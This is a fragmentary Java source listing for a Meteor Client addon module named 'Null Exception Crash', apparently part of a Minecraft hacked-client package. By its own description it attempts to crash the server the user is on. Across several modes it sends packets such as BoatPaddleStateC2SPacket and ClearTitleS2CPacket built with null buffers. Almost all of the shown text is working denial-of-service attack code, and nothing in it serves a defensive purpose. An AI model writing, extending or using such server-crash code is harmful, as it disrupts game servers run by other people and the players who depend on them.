...
public class NullExceptionCrash extends Module {
    ...
    public NullExceptionCrash() {
        super(Zeitgeist.CATEGORYC, "Null Exception Crash", "Attempts to crash the server you are on by sending null packet buffers.");
                    ...
                    case NEW -> {
                        try {
                            if ((mc.player != null) && (mc.getNetworkHandler() != null)) {
                                ...
                                mc.getNetworkHandler().sendPacket(new BoatPaddleStateC2SPacket(null));
                            }

                        } catch (NullPointerException NPE) {
                            MeteorClient.LOG.error("NullPointerException for LoginCrash NEW: ", NPE);
                        }
                    }
                    case OLD -> {
                        try {
                            ...
                            MeteorClient.LOG.error("NullPointerException for LoginCrash OLD: ", NPE);
                        }
                    ...
                    case EFFICIENT -> {
                        try {
                            if (mc.player != null && mc.getNetworkHandler() != null) {
                                ...
                                mc.getNetworkHandler().sendPacket(new BoatPaddleStateC2SPacket(null));
                                mc.getNetworkHandler().sendPacket(new ChunkDeltaUpdateS2CPacket(null));
                                ...
                                mc.getNetworkHandler().sendPacket(new ClearTitleS2CPacket(null));
                            }

                        } catch (NullPointerException NPE) {
                            MeteorClient.LOG.error("NullPointerException for EntityCrash Boat: ", NPE);
                        }
